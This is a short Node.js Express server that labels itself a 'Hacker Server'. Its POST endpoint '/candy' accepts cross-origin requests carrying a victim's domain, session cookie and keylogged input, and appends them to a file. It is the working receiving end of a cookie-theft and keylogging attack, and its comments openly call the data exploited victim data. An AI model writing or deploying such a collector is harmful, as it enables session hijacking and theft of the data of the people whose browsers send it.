const express = require('express')
var bodyParser = require('body-parser');
var cors = require('cors')
const app = express()
const port = 3000

// create application/json parser
var jsonParser = bodyParser.json()

//Allow Cross Origin Requests
app.use(cors())

// POST endpoint for acceptim victim's data
app.post('/candy', jsonParser, function (req, res) {
  const fs = require('fs');
  const session = {
    domain : req.body.domain,
    cookie : req.body.cookie,
    keylog : req.query.k
  }
  console.log(session)
  //Save exploited data into a file
  fs.appendFile("sessiondata.txt", JSON.stringify(session)+'\r\n', function (err) {
    if (err) {
      return console.log(err);
    }
    console.log("The file was saved!");
  });
})
app.listen(port, () => console.log(`Hacker Server running on ${port}!`))